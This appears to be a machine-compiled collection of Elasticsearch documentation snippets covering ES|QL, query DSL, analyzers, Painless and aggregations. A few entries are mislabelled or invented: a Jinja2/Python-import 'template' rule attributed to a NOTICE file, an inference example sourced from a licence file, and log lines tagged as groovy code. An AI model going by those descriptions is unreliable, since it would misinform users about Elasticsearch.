\"variance_population\": 41105.55555555556,\n         \"variance_sampling\": 61658.33333333334,\n         \"std_deviation\": 202.74505063146563,\n         \"std_deviation_population\": 202.74505063146563,\n         \"std_deviation_sampling\": 248.3109609609156,\n         \"std_deviation_bounds\": {\n           \"upper\": 733.8234345962646,\n           \"lower\": -77.15676792959795,\n           \"upper_population\" : 733.8234345962646,\n           \"lower_population\" : -77.15676792959795,\n           \"upper_sampling\" : 824.9552552551645,\n           \"lower_sampling\" : -168.28858858849787\n         }\n      }\n   }\n}\n```\n\n----------------------------------------\n\nTITLE: Finding Percolator Queries with Failed Term Extraction in Elasticsearch\nDESCRIPTION: This query searches for percolator queries where term extraction has failed. Such queries can't benefit from the performance optimization that reduces candidate matches during percolation. This assumes a 'query' field of type 'percolator' in the mappings.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-percolate-query.md#2025-04-21_snippet_12\n\nLANGUAGE: console\nCODE:\n```\nGET /_search\n{\n  \"query\": {\n    \"term\" : {\n      \"query.extraction_result\" : \"failed\"\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Task Execution Summary\nDESCRIPTION: This snippet provides a brief summary of selected primary tasks for the cleanTest process and test execution from the 'libs:simdvec' project, showcasing the result of task name matches during the operation.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/libs/simdvec/output.txt#2025-04-21_snippet_14\n\nLANGUAGE: groovy\nCODE:\n```\nAll projects evaluated.\n```\n\nLANGUAGE: groovy\nCODE:\n```\ntest#with21\n```\n\nLANGUAGE: groovy\nCODE:\n```\nTask name matched 'cleanTest'\n```\n\nLANGUAGE: groovy\nCODE:\n```\nTask name matched 'test'\n```\n\nLANGUAGE: groovy\nCODE:\n```\nSelected primary task 'cleanTest' from project :libs:simdvec\n```\n\nLANGUAGE: groovy\nCODE:\n```\nSelected primary task 'test' from project :libs:simdvec\n```\n\n----------------------------------------\n\nTITLE: Creating Index for Terms Lookup Example\nDESCRIPTION: Demonstrates creating an Elasticsearch index with a keyword field for terms lookup demonstration\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-terms-query.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPUT my-index-000001\n{\n  \"mappings\": {\n    \"properties\": {\n      \"color\": { \"type\": \"keyword\" }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Creating English Custom Analyzer in Elasticsearch\nDESCRIPTION: This snippet details the creation of a custom analyzer designed for English language texts in Elasticsearch. It includes various filters such as possessive stemming, stop words, and keyword markers for effective text processing.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-lang-analyzer.md#2025-04-21_snippet_11\n\nLANGUAGE: json\nCODE:\n```\nPUT /english_example\n{\n  \"settings\": {\n    \"analysis\": {\n      \"filter\": {\n        \"english_stop\": {\n          \"type\":       \"stop\",\n          \"stopwords\":  \"_english_\" <1>\n        },\n        \"english_keywords\": {\n          \"type\":       \"keyword_marker\",\n          \"keywords\":   [\"example\"] <2>\n        },\n        \"english_stemmer\": {\n          \"type\":       \"stemmer\",\n          \"language\":   \"english\"\n        },\n        \"english_possessive_stemmer\": {\n          \"type\":       \"stemmer\",\n          \"language\":   \"possessive_english\"\n        }\n      },\n      \"analyzer\": {\n        \"rebuilt_english\": {\n          \"tokenizer\":  \"standard\",\n          \"filter\": [\n            \"english_possessive_stemmer\",\n            \"lowercase\",\n            \"english_stop\",\n            \"english_keywords\",\n            \"english_stemmer\"\n          ]\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Sample Corporate Copyright Disclaimer\nDESCRIPTION: Provides a sample template for a corporate disclaimer, relinquishing copyright interests on a software program. It is intended as a guide for companies or educational institutions.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/ingest-attachment/licenses/tika-parser-apple-module-NOTICE.txt#2025-04-21_snippet_5\n\nLANGUAGE: plaintext\nCODE:\n```\nYoyodyne, Inc., hereby disclaims all copyright interest in the\nprogram `Gnomovision\\' (which makes passes at compilers) written by\nJames Hacker.\n\nsignature of Ty Coon, 1 April 1989\nTy Coon, President of Vice\n```\n\n----------------------------------------\n\nTITLE: Defining Math Class Methods and Constants in Java\nDESCRIPTION: This snippet shows the public methods and constants of the java.lang.Math class. It includes mathematical constants like E and PI, and various mathematical operations and functions.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/java.lang.txt#2025-04-21_snippet_14\n\nLANGUAGE: Java\nCODE:\n```\nclass java.lang.Math {\n  double E\n  double PI\n  double abs(double)\n  double acos(double)\n  double asin(double)\n  double atan(double)\n  double atan2(double,double)\n  double cbrt(double)\n  double ceil(double)\n  double copySign(double,double)\n  double cos(double)\n  double cosh(double)\n  double exp(double)\n  double expm1(double)\n  double floor(double)\n  double hypot(double,double)\n  double IEEEremainder(double,double)\n  double log(double)\n  double log10(double)\n  double log1p(double)\n  double max(double,double)\n  double min(double,double)\n  double nextAfter(double,double)\n  double nextDown(double)\n  double nextUp(double)\n  double pow(double,double)\n  double random() @nondeterministic\n  double rint(double)\n  long round(double)\n  double scalb(double,int)\n  double signum(double)\n  double sin(double)\n  double sinh(double)\n  double sqrt(double)\n  double tan(double)\n  double tanh(double)\n  double toDegrees(double)\n  double toRadians(double)\n  double ulp(double)\n}\n```\n\n----------------------------------------\n\nTITLE: Basic SHOW TABLES Example\nDESCRIPTION: Demonstrates basic usage of SHOW TABLES command showing catalog, name, type, and kind columns for all available tables.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-syntax-show-tables.md#2025-04-21_snippet_1\n\nLANGUAGE: sql\nCODE:\n```\nSHOW TABLES;\n```\n\n----------------------------------------\n\nTITLE: Weekly Bucketing with Target Count in ESQL\nDESCRIPTION: Creates weekly buckets for hire dates over a year period, targeting 100 buckets maximum. Shows how increasing the target bucket count results in smaller bucket sizes.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/bucket.md#2025-04-21_snippet_2\n\nLANGUAGE: esql\nCODE:\n```\nFROM employees\n| WHERE hire_date >= \"1985-01-01T00:00:00Z\" AND hire_date < \"1986-01-01T00:00:00Z\"\n| STATS hires_per_week = COUNT(*) BY week = BUCKET(hire_date, 100, \"1985-01-01T00:00:00Z\", \"1986-01-01T00:00:00Z\")\n```\n\n----------------------------------------\n\nTITLE: Getting a specific extension in Elasticsearch Service\nDESCRIPTION: API call to retrieve information about a specific extension using its ID. Returns metadata about the extension without the actual file content.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/cloud/ec-plugins-guide.md#2025-04-21_snippet_8\n\nLANGUAGE: sh\nCODE:\n```\ncurl -X GET \\\n  https://api.elastic-cloud.com/api/v1/deployments/extensions/EXTENSION_ID \\\n  -H 'Content-Type: application/json' \\\n  -H \"Authorization: ApiKey $CLOUD_API_KEY\" \\\n```\n\n----------------------------------------\n\nTITLE: Defining List Access Grammar in Painless\nDESCRIPTION: Specifies the grammar for the list access operator in Painless, which is used to access or modify elements in a List.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-operators-reference.md#2025-04-21_snippet_8\n\nLANGUAGE: text\nCODE:\n```\nlist_access: '[' expression ']'\n```\n\n----------------------------------------\n\nTITLE: Incorrect Jinja2 Template with Unsupported Python Import\nDESCRIPTION: An example of an invalid Jinja2 template that attempts to import a non-standard library module. This demonstrates what's not allowed in Elasticsearch templates, as only standard library modules can be imported.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/distribution/tools/ansi-console/licenses/jansi-NOTICE.txt#2025-04-21_snippet_6\n\nLANGUAGE: python\nCODE:\n```\nimport requests\n```\n\n----------------------------------------\n\nTITLE: Setting Floor Segment Size\nDESCRIPTION: Dynamic setting that controls the floor segment size for preventing small segment tails. Defaults to 100MB.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/data-stream-lifecycle-settings.md#2025-04-21_snippet_5\n\nLANGUAGE: yaml\nCODE:\n```\ndata_streams.lifecycle.target.merge.policy.floor_segment: 100MB\n```\n\n----------------------------------------\n\nTITLE: Searching Books by Author using QSTR in ESQL\nDESCRIPTION: This ESQL query searches for books where the author field contains 'Faulkner'. It demonstrates the basic usage of the QSTR function for text-based queries in Elasticsearch.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/qstr.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM books\n| WHERE QSTR(\"author: Faulkner\")\n```\n\n----------------------------------------\n\nTITLE: Function Parameter Documentation in Markdown\nDESCRIPTION: Parameter documentation for a numeric expression input field that accepts a numeric value and handles null cases by returning null.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/parameters/ceil.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.\n\n**Parameters**\n\n`number`\n:   Numeric expression. If `null`, the function returns `null`.\n```\n\n----------------------------------------\n\nTITLE: Configuring HTTP Tracer URI Patterns\nDESCRIPTION: Configures which URIs will be traced using include and exclude patterns.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/networking-settings.md#2025-04-21_snippet_12\n\nLANGUAGE: console\nCODE:\n```\nPUT _cluster/settings\n{\n   \"persistent\" : {\n      \"http.tracer.include\" : \"*\",\n      \"http.tracer.exclude\" : \"\"\n   }\n}\n```\n\n----------------------------------------\n\nTITLE: Basic ESQL FROM Command Syntax\nDESCRIPTION: Defines the basic syntax for the ESQL FROM command, which is used to specify the data source for a query.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/commands/layout/from.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM index_pattern [METADATA fields]\n```\n\n----------------------------------------\n\nTITLE: Configuring and Using ICU Transform Token Filter in Elasticsearch\nDESCRIPTION: This snippet demonstrates how to configure an index with an ICU transform token filter and use it to analyze text in different languages. It shows the setup for transliterating characters to Latin, separating and removing accents, and normalizing the text.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/analysis-icu-transform.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT icu_sample\n{\n  \"settings\": {\n    \"index\": {\n      \"analysis\": {\n        \"analyzer\": {\n          \"latin\": {\n            \"tokenizer\": \"keyword\",\n            \"filter\": [\n              \"myLatinTransform\"\n            ]\n          }\n        },\n        \"filter\": {\n          \"myLatinTransform\": {\n            \"type\": \"icu_transform\",\n            \"id\": \"Any-Latin; NFD; [:Nonspacing Mark:] Remove; NFC\"\n          }\n        }\n      }\n    }\n  }\n}\n\nGET icu_sample/_analyze\n{\n  \"analyzer\": \"latin\",\n  \"text\": \"你好\"\n}\n\nGET icu_sample/_analyze\n{\n  \"analyzer\": \"latin\",\n  \"text\": \"здравствуйте\"\n}\n\nGET icu_sample/_analyze\n{\n  \"analyzer\": \"latin\",\n  \"text\": \"こんにちは\"\n}\n```\n\n----------------------------------------\n\nTITLE: Sample Response for Bucket Selector Aggregation Query\nDESCRIPTION: This snippet shows a sample response from an Elasticsearch query using bucket selector aggregation. It demonstrates how buckets with total sales less than 200 are excluded from the results.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-pipeline-bucket-selector-aggregation.md#2025-04-21_snippet_2\n\nLANGUAGE: console-result\nCODE:\n```\n{\n   \"took\": 11,\n   \"timed_out\": false,\n   \"_shards\": ...,\n   \"hits\": ...,\n   \"aggregations\": {\n      \"sales_per_month\": {\n         \"buckets\": [\n            {\n               \"key_as_string\": \"2015/01/01 00:00:00\",\n               \"key\": 1420070400000,\n               \"doc_count\": 3,\n               \"total_sales\": {\n                   \"value\": 550.0\n               }\n            },\n            {\n               \"key_as_string\": \"2015/03/01 00:00:00\",\n               \"key\": 1425168000000,\n               \"doc_count\": 2,\n               \"total_sales\": {\n                   \"value\": 375.0\n               }\n            }\n         ]\n      }\n   }\n}\n```\n\n----------------------------------------\n\nTITLE: Multiplying Numbers in ESQL\nDESCRIPTION: Performs multiplication of two numeric values with a special constraint that multivalued fields result in null. Part of Elasticsearch's Query Language (ESQL) functionality.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/kibana/docs/operators/mul.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nMULTIPLY `*`\n```\n\n----------------------------------------\n\nTITLE: Performing Cartesian-bounds Aggregation on Shape Data\nDESCRIPTION: This snippet shows how to perform a cartesian-bounds aggregation on a Shape field, returning the bounding box of all documents in the index.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-metrics-cartesian-bounds-aggregation.md#2025-04-21_snippet_4\n\nLANGUAGE: console\nCODE:\n```\nPOST /places/_search?size=0\n{\n  \"aggs\": {\n    \"viewport\": {\n      \"cartesian_bounds\": {\n        \"field\": \"geometry\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: SQL Query Using Explicit Multi-field Reference\nDESCRIPTION: An SQL query explicitly referencing a keyword multi-field for exact matching. This is equivalent to the previous query as Elasticsearch SQL automatically selects the appropriate field.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-data-types.md#2025-04-21_snippet_2\n\nLANGUAGE: sql\nCODE:\n```\nSELECT first_name FROM index WHERE first_name.raw = 'John'\n```\n\n----------------------------------------\n\nTITLE: Structure of Cron Expressions in Elasticsearch\nDESCRIPTION: The basic structure of a cron expression used in Elasticsearch, showing the order of time components that must be specified for scheduling operations.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/api-conventions.md#2025-04-21_snippet_1\n\nLANGUAGE: txt\nCODE:\n```\n    <seconds> <minutes> <hours> <day_of_month> <month> <day_of_week> [year]\n```\n\n----------------------------------------\n\nTITLE: Elasticsearch Configuration Example in Yaml\nDESCRIPTION: This YAML snippet outlines how to configure the Elastic network drive connector when connecting to a Dockerized instance of Elasticsearch and Kibana. It specifies connection details like host and API key.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-network-drive.md#2025-04-21_snippet_2\n\nLANGUAGE: yaml\nCODE:\n```\n# When connecting to your cloud deployment you should edit the host value\nelasticsearch.host: http://host.docker.internal:9200\nelasticsearch.api_key: <ELASTICSEARCH_API_KEY>\n\nconnectors:\n  -\n    connector_id: <CONNECTOR_ID_FROM_KIBANA>\n    service_type: network_drive\n    api_key: <CONNECTOR_API_KEY_FROM_KIBANA> # Optional. If not provided, the connector will use the elasticsearch.api_key instead\n```\n\n----------------------------------------\n\nTITLE: Converting CAs to PKCS#12 Format\nDESCRIPTION: This snippet converts all created CAs into PKCS#12 format using the keytool command. It ensures that certificates are properly stored as PKCS#12 keystores.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/libs/ssl-config/src/test/resources/certs/README.txt#2025-04-21_snippet_5\n\nLANGUAGE: bash\nCODE:\n```\n# 6. Convert CAs to PKCS#12\n\nfor n in 1 2 3\ndo\n    keytool -importcert -file ca${n}/ca.crt -alias ca -keystore ca${n}/ca.p12 -storetype PKCS12 -storepass p12-pass -v \n    keytool -importcert -file ca${n}/ca.crt -alias ca${n} -keystore ca-all/ca.p12 -storetype PKCS12 -storepass p12-pass -v \ndone\n```\n\n----------------------------------------\n\nTITLE: Calculating Population Variance with VAR_POP in SQL\nDESCRIPTION: This SQL snippet demonstrates how to calculate the population variance of values in the specified field (field_name). The VAR_POP function calculates the population variance and ignores null values.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-aggs.md#2025-04-21_snippet_21\n\nLANGUAGE: sql\nCODE:\n```\n```sql\nVAR_POP(field_name) <1>\n```\n```\n\n----------------------------------------\n\nTITLE: Converting First Vowel to Uppercase with replaceFirst in Painless\nDESCRIPTION: Uses Painless's replaceFirst with a function to make only the first vowel in player last names uppercase.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/brief-painless-walkthrough.md#2025-04-21_snippet_14\n\nLANGUAGE: console\nCODE:\n```\nPOST hockey/_update_by_query\n{\n  \"script\": {\n    \"lang\": \"painless\",\n    \"source\": \"\"\"\n      ctx._source.last = ctx._source.last.replaceFirst(/[aeiou]/, m ->\n        m.group().toUpperCase(Locale.ROOT))\n    \"\"\"\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Highlighting Example - HTML Output\nDESCRIPTION: Examples of HTML highlighting behavior with pattern capture tokens\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-pattern-capture-tokenfilter.md#2025-04-21_snippet_6\n\nLANGUAGE: html\nCODE:\n```\n  <em>john-smith_123@foo-bar.com</em>\n```\n\nLANGUAGE: html\nCODE:\n```\n  john-<em>smith</em>_123@foo-bar.com\n```\n\n----------------------------------------\n\nTITLE: Equality Equals with Def Type in Painless\nDESCRIPTION: Illustrates the usage of the equality equals operator with the 'def' type in Painless.  It assigns integer and HashMap/ArrayList to 'def' variables, then compares the 'def' variables, showing how the operator handles dynamic typing and different object types.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-operators-boolean.md#2025-04-21_snippet_15\n\nLANGUAGE: painless\nCODE:\n```\n\"def a = 0;               <1>\ndef b = 1;               <2>\nboolean c = a == b;      <3>\ndef d = new HashMap();   <4>\ndef e = new ArrayList(); <5>\nc = d == e;              <6>\"\n```\n\n----------------------------------------\n\nTITLE: Elasticsearch Span Term Query with Term and Boost\nDESCRIPTION: This snippet demonstrates another way to specify the term and boost for a `span_term` query. It is equivalent to the previous example, explicitly using the `term` field to define the search term `kimchy` and applying a boost of 2.0. This provides an alternative syntax for achieving the same boosting effect.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-span-term-query.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nGET /_search\n{\n  \"query\": {\n    \"span_term\" : { \"user.id\" : { \"term\" : \"kimchy\", \"boost\" : 2.0 } }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Customizing Limit Token Filter in Elasticsearch\nDESCRIPTION: Example of creating a custom limit token filter named 'five_token_limit' that keeps up to five tokens from the input text, and using it in a custom analyzer with whitespace tokenizer.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-limit-token-count-tokenfilter.md#2025-04-21_snippet_3\n\nLANGUAGE: console\nCODE:\n```\nPUT custom_limit_example\n{\n  \"settings\": {\n    \"analysis\": {\n      \"analyzer\": {\n        \"whitespace_five_token_limit\": {\n          \"tokenizer\": \"whitespace\",\n          \"filter\": [ \"five_token_limit\" ]\n        }\n      },\n      \"filter\": {\n        \"five_token_limit\": {\n          \"type\": \"limit\",\n          \"max_token_count\": 5\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Indexing Multiple Entities - JSON Snippet - JavaScript\nDESCRIPTION: This JSON snippet indexes both pages and databases in Notion, where the titles contain 'Demo Page' and 'Demo Database'. It facilitates the bulk synchronization of different entity types.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-notion.md#2025-04-21_snippet_6\n\nLANGUAGE: javascript\nCODE:\n```\n{\n  \"searches\": [\n    {\n      \"filter\": {\n        \"value\": \"database\"\n      },\n      \"query\": \"Demo Database\"\n    },\n    {\n      \"filter\": {\n        \"value\": \"page\"\n      },\n      \"query\": \"Demo Page\"\n    }\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Running Multiple Metric Aggregations\nDESCRIPTION: Example of running min, max, sum, value_count, and avg aggregations on an aggregate_metric_double field.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/aggregate-metric-double.md#2025-04-21_snippet_3\n\nLANGUAGE: console\nCODE:\n```\nPOST stats-index/_search?size=0\n{\n  \"aggs\": {\n    \"metric_min\": { \"min\": { \"field\": \"agg_metric\" } },\n    \"metric_max\": { \"max\": { \"field\": \"agg_metric\" } },\n    \"metric_value_count\": { \"value_count\": { \"field\": \"agg_metric\" } },\n    \"metric_sum\": { \"sum\": { \"field\": \"agg_metric\" } },\n    \"metric_avg\": { \"avg\": { \"field\": \"agg_metric\" } }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Performing ML Inference via Elasticsearch API\nDESCRIPTION: API call to directly perform inference using a trained ML model without indexing the document. This example uses a sentiment analysis model on text input to analyze its sentiment.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/repository-gcs/licenses/google-api-services-storage-NOTICE.txt#2025-04-21_snippet_5\n\nLANGUAGE: bash\nCODE:\n```\nPOST _ml/trained_models/sentiment_model/_infer\n{\n  \"docs\": {\n    \"text_field\": \"I love working with Elasticsearch!\"\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Installing Stempel Polish Analysis Plugin in Elasticsearch\nDESCRIPTION: Command to install the Stempel Polish analysis plugin using the Elasticsearch plugin manager. Must be executed on every node in the cluster, and each node must be restarted after installation.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/analysis-stempel.md#2025-04-21_snippet_0\n\nLANGUAGE: sh\nCODE:\n```\nsudo bin/elasticsearch-plugin install analysis-stempel\n```\n\n----------------------------------------\n\nTITLE: Logging delete_role_mapping Event in Elasticsearch\nDESCRIPTION: Example of an audit log for the delete role mapping event. This event is logged when the API is invoked to delete a role mapping from the security system.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/elasticsearch-audit-events.md#2025-04-21_snippet_8\n\nLANGUAGE: javascript\nCODE:\n```\n{\"type\":\"audit\", \"timestamp\":\"2020-12-31T00:12:09,349+0200\", \"node.id\":\n\"0RMNyghkQYCc_gVd1G6tZQ\", \"event.type\":\"security_config_change\", \"event.\naction\":\"delete_role_mapping\", \"request.id\":\"Stim-DuoSTCWom0S_xhf8g\",\n\"delete\":{\"role_mapping\":{\"name\":\"mapping1\"}}}\n```\n\n----------------------------------------\n\nTITLE: Configuring Initial Master Nodes in Elasticsearch\nDESCRIPTION: Static setting for defining the initial set of master-eligible nodes in a new cluster. Should only be used during initial cluster bootstrap.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/discovery-cluster-formation-settings.md#2025-04-21_snippet_3\n\nLANGUAGE: yaml\nCODE:\n```\ncluster.initial_master_nodes: []\n```\n\n----------------------------------------\n\nTITLE: Configuring HTML Sanitization Allow List in Elasticsearch YAML\nDESCRIPTION: Specifies HTML elements that are allowed in email notifications. Supports individual elements and feature groups like _tables, _blocks, _formatting, _links, and _styles.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/watcher-settings.md#2025-04-21_snippet_24\n\nLANGUAGE: yaml\nCODE:\n```\nxpack.notification.email.html.sanitization.allow\n```\n\n----------------------------------------\n\nTITLE: Querying Disjoint Geometries Using ST_DISJOINT in ESQL\nDESCRIPTION: This ESQL query demonstrates the use of ST_DISJOINT function to filter airport city boundaries that are disjoint from a specified polygon. It checks if the city boundary does not intersect with the given polygon and returns selected fields for matching records.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/kibana/docs/functions/st_disjoint.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM airport_city_boundaries\n| WHERE ST_DISJOINT(city_boundary, TO_GEOSHAPE(\"POLYGON((-10 -60, 120 -60, 120 60, -10 60, -10 -60))\"))\n| KEEP abbrev, airport, region, city, city_location\n```\n\n----------------------------------------\n\nTITLE: Indexing Parent Document\nDESCRIPTION: Indexes a parent document with a specific ID and join field configuration, establishing the parent document in the parent-child relationship.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-parent-id-query.md#2025-04-21_snippet_1\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"text\": \"This is a parent document.\",\n  \"my-join-field\": \"my-parent\"\n}\n```\n\n----------------------------------------\n\nTITLE: Json Class Methods in Painless API\nDESCRIPTION: This snippet defines methods for handling JSON data in Elasticsearch's Painless scripting. The 'load' method takes a string as input, while 'dump' methods convert data to a JSON string, optionally formatted as pretty print.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/org.elasticsearch.script.update.txt#2025-04-21_snippet_1\n\nLANGUAGE: groovy\nCODE:\n```\nclass org.elasticsearch.painless.api.Json {\n  def load(String)\n  String dump(def)\n  String dump(def, boolean)\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring and Using Phonetic Token Filter in Elasticsearch\nDESCRIPTION: Example showing how to create an index with a custom analyzer using phonetic token filtering with metaphone encoding, and then analyzing text with this analyzer. The example uses metaphone encoding without replacing the original tokens.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/analysis-phonetic-token-filter.md#2025-04-21_snippet_0\n\nLANGUAGE: json\nCODE:\n```\nPUT phonetic_sample\n{\n  \"settings\": {\n    \"index\": {\n      \"analysis\": {\n        \"analyzer\": {\n          \"my_analyzer\": {\n            \"tokenizer\": \"standard\",\n            \"filter\": [\n              \"lowercase\",\n              \"my_metaphone\"\n            ]\n          }\n        },\n        \"filter\": {\n          \"my_metaphone\": {\n            \"type\": \"phonetic\",\n            \"encoder\": \"metaphone\",\n            \"replace\": false\n          }\n        }\n      }\n    }\n  }\n}\n\nGET phonetic_sample/_analyze\n{\n  \"analyzer\": \"my_analyzer\",\n  \"text\": \"Joe Bloggs\"\n}\n```\n\n----------------------------------------\n\nTITLE: Aggregating on a Date Range Field with Query Bounds\nDESCRIPTION: This snippet illustrates how query bounds do not act as filters for aggregations, showing a date_histogram aggregation that includes data outside the query range.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-range-field-note.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nPOST /range_index/_search?size=0\n{\n  \"query\": {\n    \"range\": {\n      \"time_frame\": {\n        \"gte\": \"2019-11-01\",\n        \"format\": \"yyyy-MM-dd\"\n      }\n    }\n  },\n  \"aggs\": {\n    \"november_data\": {\n      \"date_histogram\": {\n        \"field\": \"time_frame\",\n        \"calendar_interval\": \"day\",\n        \"format\": \"yyyy-MM-dd\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Basic Value Count Aggregation in Elasticsearch\nDESCRIPTION: Demonstrates a simple value count aggregation on the 'type' field in the 'sales' index. The aggregation counts the number of values in the specified field across all matching documents.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-metrics-valuecount-aggregation.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPOST /sales/_search?size=0\n{\n  \"aggs\" : {\n    \"types_count\" : { \"value_count\" : { \"field\" : \"type\" } }\n  }\n}\n```\n\nLANGUAGE: console-result\nCODE:\n```\n{\n  ...\n  \"aggregations\": {\n    \"types_count\": {\n      \"value\": 7\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Email Profile in Elasticsearch YAML\nDESCRIPTION: Specifies the email profile to use for building MIME messages. Valid values are 'standard', 'gmail' and 'outlook', defaulting to 'standard'.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/watcher-settings.md#2025-04-21_snippet_7\n\nLANGUAGE: yaml\nCODE:\n```\nprofile\n```\n\n----------------------------------------\n\nTITLE: ESQL Query with Explicit Limit\nDESCRIPTION: Shows an ESQL query with an explicit LIMIT command, equivalent to the previous query.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/common/result-set-size-limitation.md#2025-04-21_snippet_1\n\nLANGUAGE: esql\nCODE:\n```\nFROM index | WHERE field = \"value\" | LIMIT 1000\n```\n\n----------------------------------------\n\nTITLE: Specifying Distance Unit in Geo-distance Aggregation\nDESCRIPTION: Demonstrates how to specify the distance unit (kilometers in this case) when using geo-distance aggregation in Elasticsearch.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-geodistance-aggregation.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPOST /museums/_search?size=0\n{\n  \"aggs\": {\n    \"rings\": {\n      \"geo_distance\": {\n        \"field\": \"location\",\n        \"origin\": \"POINT (4.894 52.3760)\",\n        \"unit\": \"km\", \n        \"ranges\": [\n          { \"to\": 100 },\n          { \"from\": 100, \"to\": 300 },\n          { \"from\": 300 }\n        ]\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Google Normalized Distance\nDESCRIPTION: Example of implementing Google normalized distance (GND) as a significance measure.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-significantterms-aggregation.md#2025-04-21_snippet_7\n\nLANGUAGE: javascript\nCODE:\n```\n\"gnd\": {\n}\n```\n\n----------------------------------------\n\nTITLE: Extracting documents with geotile geo_grid query\nDESCRIPTION: This snippet shows how to 